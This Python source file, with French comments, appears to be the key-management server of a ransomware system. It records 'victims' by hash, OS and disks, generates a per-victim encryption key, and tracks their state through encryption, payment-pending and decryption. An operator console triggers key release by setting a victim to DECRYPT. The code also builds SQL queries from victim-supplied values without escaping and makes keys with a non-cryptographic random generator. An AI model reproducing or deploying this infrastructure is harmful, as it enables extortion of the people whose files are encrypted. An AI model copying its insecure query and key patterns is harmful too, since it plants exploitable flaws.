from threading import Thread
import queue
import string
import random
import utile.network as network
import utile.message
import utile.data as data
import utile.security as security
import utile.config as config
import time

load = config.load_config('../configuration/config/serveur_cles.cfg', '../configuration/config/serveur_cles.key')
AES_GCM = config.get_config('AES_GCM')
DEBUG_MODE = config.get_config('DEBUG_MODE')
PORT_SERV_CONSOLE = int(config.get_config('PORT_SERV_CONSOLE'))
PORT_SERV_FRONTAL = int(config.get_config('PORT_SERV_FRONTAL'))


def generate_key(longueur=0, caracteres=string.ascii_letters + string.digits):
    return ''.join(random.choice(caracteres) for i in range(longueur))

def check_hash(conn, hash_victim):
    """
    Vérifie si la signature hash de la victime est déjà enregistré en DB
    :param conn:
    :param hash_victim: Signature de la victime
    :return: (list ou None) id_victim et key si trouvé
    """
    query = f'''
    SELECT victims.id_victim,  victims.key
    FROM victims
    WHERE victims.hash = "{hash_victim}"
    '''
    victim = data.select_data(conn, query)
    if not victim:
        print(f"Pas de victime avec le hash : {hash_victim[-12:]}")
        return None
    else:
        victim = list(victim[0])    # Transforme la liste de tuples en une liste simple
        print(f"Une victime avec le hash {hash_victim[-12:]} existe en DB sur l'ID {victim[0]}")
        # Recherche le dernier état en DB pour cette victime
        query = f'''
        SELECT states.state, MAX(states.datetime)
        FROM states
        WHERE states.id_victim = {victim[0]}
        '''
        last_state = (data.select_data(conn, query))[0][0]
        victim.append(last_state)
        return victim
def ajout_victim(db, id, os, disk, key):
    current_date = int(time.time())
    # Insérer les données de la victime dans la table 'victims'
    data.insert_data(db, 'victims', '(os, hash, disks, key)', f'("{os}", "{id}", "{disk}", "{key}")')
    # Sélectionner l'ID de la victime en fonction de son hash
    id_victim = data.select_data(db, f'SELECT id_victim FROM victims WHERE hash = "{id}"')[0][0]
    # Insérer l'état INITIALIZE pour la victime dans la table 'states'
    data.insert_data(db, 'states', '(id_victim,datetime, state)', f'({id_victim},{current_date}, "INITIALIZE")')
    # Retourner l'ID de la victime
    return id_victim


def main():
    """
    Fonction principale du programme.
    Elle initialise la communication avec la base de données, crée des files d'attente pour les réponses,
    et lance deux threads pour traiter les requêtes provenant du frontal et de la console.
    """
    connexion_db = data.connect_db()  # Connexion à la base de données
    fifo_db = queue.Queue()  # File d'attente pour les requêtes vers la base de données
    fifo_rep_front = queue.Queue()  # File d'attente pour les réponses vers le frontal
    fifo_rep_console = queue.Queue()  # File d'attente pour les réponses vers la console

    # Lancement des threads pour traiter les requêtes
    thread_front = Thread(target=thread_frontal, args=(fifo_db, fifo_rep_front), daemon=True).start()
    thread_cons = Thread(target=thread_console, args=(fifo_db, fifo_rep_console), daemon=True).start()

    while True:
        msg = fifo_db.get()  # Récupération du message depuis la file d'attente
        msg_type = utile.message.get_message_type(msg)  # Obtention du type de message
        print("message 1 " + str(msg))
        # Traitement en fonction du type de message
        if msg_type == 'LIST_VICTIM_REQ':
            print("Type du msg : " + str(msg_type))
            list_victim = data.get_list_victims(connexion_db)
            for victim in list_victim:
                msg = utile.message.set_message('list_victim_resp', victim)
                fifo_rep_console.put(msg)
                fifo_rep_console.join()
                # Fin de boucle on envoit list_victime_end dans la queue fifo de reponse console
            msg = utile.message.set_message('list_victim_end')
            fifo_rep_console.put(msg)
            fifo_rep_console.join()
            fifo_db.task_done()
        if msg_type == 'HISTORY_REQ':
            id_victim = msg['HIST_REQ']
            print("id_victim : " + str(id_victim))
            histories = utile.data.get_list_history(connexion_db, id_victim)
            print(histories)
            for history in histories:
                print("historique de chaque : "+str(history))
                # Envoi des messages history_resp
                msg = utile.message.set_message('history_resp', history)
                # Envoi du msg sur la queue q_response_console
                fifo_rep_console.put(msg)
                fifo_rep_console.join()
            # Envoi du message history_end
            msg = utile.message.set_message('history_end', [id_victim])
            # Envoi du msg sur la queue q_response_console
            fifo_rep_console.put(msg)
            fifo_rep_console.join()
            fifo_db.task_done()
        if msg_type == 'CHANGE_STATE':
            id_victim = msg['CHGSTATE']
            print("state " + str(id_victim))
            utile.data.insert_data(connexion_db, 'states', '(id_victim,datetime, state)',f"({id_victim},{int(time.time())}, 'DECRYPT')")
            fifo_db.task_done()
            print("Changement d'état")
        if msg_type == 'INITIALIZE_REQ':
            # Check si HASH existe déjà en DB
            victim = check_hash(connexion_db, msg['INITIALIZE'])  # Retourne l'id_victim + key_victim + last_state
            if victim is None:
                # Génère la nouvelle clé
                key_victim = generate_key(512)
                # Enregistrement en DB de la nouvelle victime
                id_victim = ajout_victim(connexion_db, msg['INITIALIZE'], msg['OS'], msg['DISKS'], key_victim)
                victim = [id_victim, key_victim, 'INITIALIZE']
            # Envoie du initialize_key
            msg = utile.message.set_message('initialize_key', victim)
            # Envoi du msg sur la queue q_response_console
            print(f"Put msg {msg}")
            fifo_rep_front.put(msg)
            fifo_rep_front.join()
        if msg_type == 'CRYPT_START':
            id_victim = msg['CRYPT']
            print("Ajout de l'état CRYPT a la db" + str(id_victim))
            utile.data.insert_data(connexion_db, 'states', '(id_victim,datetime, state)',f"({id_victim},{int(time.time())}, 'CRYPT')")
            fifo_db.task_done()
        if msg_type == "PENDING_MSG":
            victim = check_hash(connexion_db, msg['PENDING'])
            print(victim)
            if victim[2] == "CRYPT" or victim[2] == "INITIALIZE":
                print("Ajout de l'état PENDING a la db")
                utile.data.insert_data(connexion_db, 'states', '(id_victim,datetime, state)',
                                       f"({victim[0]},{int(time.time())}, 'PENDING')")
            if victim[2] == "DECRYPT":
                print(msg)
                msg = utile.message.set_message("DECRYPT_REQ", [msg['PENDING'],victim[1]])
                print("envois de  " + str(msg))
                fifo_rep_front.put(msg)
                fifo_rep_front.join()
        if msg_type == 'RESTART_REQ':
            victim = check_hash(connexion_db, msg['RESTART'])
            msg = utile.message.set_message("RESTART_RESP", [msg['RESTART'],victim[1]])
            fifo_rep_front.put(msg)
            fifo_rep_front.join()

def thread_console(fifo_db, fifo_rep_console):
    """
    Fonction exécutée dans un thread séparé pour traiter les requêtes provenant de la console.
    Elle attend les requêtes, les déchiffre et les traite, puis envoie les réponses.
    """
    server_socket = network.start_net_serv(port=PORT_SERV_CONSOLE)
    while True:
        socket_console, _ = server_socket.accept()
        while True:
            aes_key = security.diffie_hellman_send_key(socket_console)
            message = network.receive_message(socket_console)
            message = security.aes_decrypt(message, aes_key)
            print("Message décrypté" + str(message))
            msg_type = utile.message.get_message_type(message)
            print(f"Message du client : {message}")
            print(f"Type : {msg_type}")
            if msg_type == 'LIST_VICTIM_REQ':
                fifo_db.put(message) # Dans la file d'attente db on envoit le message LIST_VICTIM_REQ
                message = fifo_rep_console.get() #On récupere le message qu'envoit le serveur clé qui est dans la file d'attente
                msg_type = utile.message.get_message_type(message)
                while msg_type != 'LIST_VICTIM_END':
                    message = security.aes_encrypt(message, aes_key)
                    network.send_message(socket_console, message)
                    fifo_rep_console.task_done()
                    message = fifo_rep_console.get()
                    msg_type = utile.message.get_message_type(message)
                message = security.aes_encrypt(message, aes_key)
                network.send_message(socket_console, message)
                fifo_rep_console.task_done()
            elif msg_type == 'HISTORY_REQ':
                fifo_db.put(message)  # Envoie la requête dans la queue q_request
                msg = fifo_rep_console.get()
                msg_type = utile.message.get_message_type(msg)
                while msg_type != 'HISTORY_END':  # Envoie les historiques d'états
                    # Envoi des messages history_resp
                    msg = security.aes_encrypt(msg, aes_key)
                    network.send_message(socket_console, msg)
                    fifo_rep_console.task_done()
                    msg = fifo_rep_console.get()
                    msg_type = utile.message.get_message_type(msg)
                # Envoi du message history_end
                msg = security.aes_encrypt(msg, aes_key)
                network.send_message(socket_console, msg)
                fifo_rep_console.task_done()
            elif msg_type == 'CHANGE_STATE':
                fifo_db.put(message)  # Envoie la requête dans la queue q_request


def thread_frontal(fifo_db, fifo_rep_front):
    """
    Fonction exécutée dans un thread séparé pour traiter les requêtes provenant du frontal.
    Elle attend les requêtes, les déchiffre et les traite, puis envoie les réponses.
    """
    s_serveur = network.start_net_serv(port=PORT_SERV_FRONTAL)
    while True:
        socket_front, _ = s_serveur.accept()
        aes_key = security.diffie_hellman_send_key(socket_front)
        print("Clé : " + str(aes_key))
        while True:
            msg = network.receive_message(socket_front)
            msg = security.aes_decrypt(msg, aes_key)
            msg_type = utile.message.get_message_type(msg)
            print("Message reçu : " + str(msg) + "Son type : " + str(msg_type))
            if msg_type == 'INITIALIZE_REQ':
                fifo_db.put(msg)
                msg = fifo_rep_front.get()
                msg_type = utile.message.get_message_type(msg)
                if msg_type == 'INITIALIZE_KEY':
                    msg = security.aes_encrypt(msg, aes_key)
                    network.send_message(socket_front, msg)
                    fifo_rep_front.task_done()
            if msg_type == 'CRYPT_START':
                 fifo_db.put(msg)
            if msg_type == "PENDING_MSG":
                fifo_db.put(msg)
                msg = fifo_rep_front.get()
                msg = security.aes_encrypt(msg, aes_key)
                network.send_message(socket_front,msg)
                fifo_rep_front.task_done()
            if msg_type == 'DECRYPT_REQ':
                fifo_db.put(msg)
                msg = fifo_rep_front.get()
                msg = security.aes_encrypt(msg, aes_key)
                network.send_message(socket_front,msg)
                fifo_rep_front.task_done()
            if msg_type == "RESTART_REQ":
                fifo_db.put(msg)
                msg = fifo_rep_front.get()
                msg = security.aes_encrypt(msg, aes_key)
                network.send_message(socket_front,msg)
                fifo_rep_front.task_done()

# Appel de la fonction principale
if __name__ == "__main__":
    main()